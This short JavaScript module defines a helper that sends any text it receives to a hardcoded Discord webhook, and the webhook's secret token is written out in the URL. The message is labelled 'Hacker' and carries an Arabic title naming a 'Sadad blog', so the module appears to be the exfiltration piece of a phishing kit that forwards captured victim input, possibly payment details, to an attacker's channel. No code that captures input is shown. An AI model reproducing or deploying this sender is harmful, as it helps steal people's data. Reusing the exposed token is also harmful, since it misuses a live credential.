import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326872773951492096/u-MTfIW-cMUVn6Pan_nSy_0_F5wPupJYYVQqisKvYtoTTLx3dmsYtlymZwQ4KbsgG01t",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
